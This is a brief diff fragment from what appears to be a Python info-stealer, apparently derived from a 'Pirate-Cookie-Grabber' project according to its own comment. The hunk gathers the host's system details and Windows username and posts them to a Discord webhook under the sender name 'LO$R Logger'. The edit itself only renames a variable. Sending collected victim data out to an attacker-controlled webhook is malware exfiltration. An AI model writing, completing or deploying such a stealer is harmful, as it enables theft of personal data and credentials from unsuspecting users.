@@ -436,7 +436,7 @@ machines = platform.uname()
 pc = os.getenv("UserName")
 
 # skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded his other part
-discord = Discord(url=webhooker)
+discord = Discord(url=webhook)
 
 discord.post(
     username="LO$R Logger",
